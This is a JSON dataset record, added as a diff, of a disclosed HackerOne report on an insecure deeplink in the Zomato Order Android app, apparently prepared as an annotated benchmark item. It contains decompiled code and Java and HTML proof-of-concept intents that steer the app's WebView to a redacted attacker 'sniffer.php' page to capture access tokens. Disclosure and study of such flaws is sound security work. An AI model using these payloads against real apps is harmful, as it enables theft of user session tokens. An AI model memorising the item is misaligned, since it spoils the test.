@@ -1,0 +1,42 @@
+{
+  "reported_to": "Zomato",
+  "reported_by": "shell_c0de ",
+  "title": "[Zomato Order] Insecure deeplink leads to sensitive information disclosure",
+  "content": "\nHello, i want to report the vulnerability found,\nSince the following activity com.application.zomato.activities.DeepLinkRouter has exported=\"true\" it can be exploited by another application.\nApplication Information\nApplication: Zomato Order - Food Delivery App\nPackage Name: com.application.zomato.ordering\nVersion: 5.6.4\nVersion Status: Last\nVulnerable class: com.application.zomato.activities.DeepLinkRouter\nVulnerability\nUsing a special intent, you can send the access tokens to a malicious site.\nCode 1.75 KiB\n1Follow the code\n2public class com.application.zomato.activities.DeepLinkRouter extends BaseAppCompactActivity {\n3public void onCreate(Bundle arg4) {\n4        super.onCreate(arg4);\n5        this.setContentView(0x7F0B04D2);\n6 if((TextUtils.isEmpty(this.c)) && this.getIntent() != null && this.getIntent().getAction() != null && (\"android.intent.action.VIEW\".equals(this.getIntent().getAction()))) {\n7            this.c = this.getIntent().getData().toString();\n8        }\n9        this.e(this.c);// getting zomatodelivery://etc URL\n10//..\n11private void e(String arg11) {\n12v0 = Uri.parse(arg11);\n13            if(!\"zomato\".equals(v0.getScheme()) && !\"zomatodelivery\".equals(v0.getScheme())) {\n14                return;\n15            }\n16            v1 = v0.getHost();\n17 if(\"zloyaltywebview\".equals(v1)) {\n18                            if(TextUtils.isEmpty(v0.getQueryParameter(\"url\"))) {\n19                                goto label_1496;\n20                            }\n21                            if(v0.getQueryParameter(\"navigation_bar_type\") != null) {\n22                                if(!v0.getQueryParameter(\"navigation_bar_type\").equalsIgnoreCase(\"transparent\")) {\n23                                }\n24                                else {\n25                                    this.a(v0);//without check host\n26                                    goto label_1496;\n27                                }\n28                            }\n29\n30                            this.g(v0);//with check host\n31                            goto label_1496;\n32//..\n33   private void a(Uri arg4) {\n34        String v0 = arg4.getQueryParameter(\"header_title\");\n35        String v4 = arg4.getQueryParameter(\"url\") != null ? arg4.getQueryParameter(\"url\") : \"\";\n36        this.a(new Intent[]{WebViewActivity.newIntent(((Context)this), v4, v0, false)});//loadUrl\n37    }\nHost check missing.\n###PoC:\nJava PoC:\nCode 208 Bytes\n1  Intent intent = new Intent(\"android.intent.action.VIEW\");\n2  intent.setData(Uri.parse(\"zomatodelivery://zloyaltywebview/?url=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588sniffer.php&navigation_bar_type=transparent\"));\n3  startActivity(intent);\nPayload: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nHTML PoC:\nCode 117 Bytes\n1<a href=\"zomatodelivery://zloyaltywebview/?url=\u2588\u2588\u2588\u2588sniffer.php&navigation_bar_type=transparent\">Send token Zomato</a>\n\u2588\u2588\u2588\u2588\nPayload: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588zomato.html\nFix\nCheck the host before load to WebView, your regular check in CommonLib works fine.\nImpact\n1) Leakage of access tokens to arbitrary sites\n2) XSS/Ability of open arbitrary sites in your internal WebView\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 750,
+  "weaknesses": [
+    "None"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1632390840,
+  "report_url": "https://hackerone.com/reports/532225",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "MOBILE",
+  "steps": [
+    [
+      1,
+      "Identify that the DeepLinkRouter activity in Zomato Order app is exported (exported=\"true\") and can be exploited by another application."
+    ],
+    [
+      2,
+      "Craft a malicious intent with a specially crafted URI that bypasses host checks and loads an arbitrary URL in the WebView."
+    ],
+    [
+      3,
+      "Execute the intent either via a Java PoC or an HTML link to trigger the vulnerability."
+    ]
+  ],
+  "vuln_description": "The vulnerability involves an insecure deeplink in the Zomato Order app where the DeepLinkRouter activity is exported and can be exploited to load arbitrary URLs in the app's WebView. This can lead to leakage of access tokens and potential XSS attacks.",
+  "reason": "The vulnerability requires understanding of Android intents, deeplinks, and WebView security. The attack involves crafting a specific URI to bypass host checks, which is a known pattern but requires precise execution.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
